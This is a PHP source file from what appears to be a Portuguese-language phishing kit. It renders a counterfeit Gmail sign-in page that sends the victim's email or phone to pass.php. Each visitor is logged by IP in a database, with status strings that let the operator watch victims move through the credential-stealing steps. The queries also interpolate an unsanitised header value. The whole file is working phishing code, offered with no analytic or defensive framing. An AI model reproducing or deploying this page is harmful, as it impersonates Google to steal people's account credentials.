<?php

@session_start();
error_reporting(0);
ini_set("display_errors", 0 );

require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";
 $erro = $_REQUEST['error'];
 $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);

  $query_info = "SELECT * FROM infos WHERE ip='$ip'"; 
  $recorinfo = mysqli_query(DBConnect(), $query_info) or die(mysqli_error(DBConnect()));
  $row_infio = mysqli_fetch_assoc($recorinfo); 
  $totalRowsinfo = mysqli_num_rows($recorinfo); 
  


$email = $row_infio['usuario'];

$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo', status='Cliente online email', statusremote='Cliente online na senha do email' WHERE ip='$ip'");

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Gmail</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
 
    <main class="papapapapa">
        <div id="barra" style="display: none;   
    width: 400px;
    height: 0px
px
;">
            <img src="./img/loadercarrega.svg">
        </div>
        <br>
         <center><img src="img/okok.png"></center>

         <form action="pass.php" method="post">
            <label style='font-size:12px;left:10px;position:relative;top:20px;padding:5px;background:white;color:rgb(26, 115, 232)'>Email ou telefone</label>
            <input required class="sadsadsd" type="text" name="login">

            <img class="mobile2" style='margin-top:5px;' src="img/okokok1.png">
            <br><br><br>
 <div style='clear:both;'></div>
            <a style='text-decoration: none;color:rgb(26, 115, 232);float:left;' href=""><strong>Criar conta</strong></a>
            <input style='cursor:pointer;font-weight: bold;border:none;background:rgb(26, 115, 232);width:100px;padding:10px;border-radius:4px;color:white;float:right;' type="submit" value="Avançar" name="botao">
 <div style='clear:both;'></div>
         </form>
<br><br><br>
    </main>
    <center><img class="mobile" style='position: relative;top:-30px;' src="img/Screenshot_3.png"></center>
    
</body>
</html>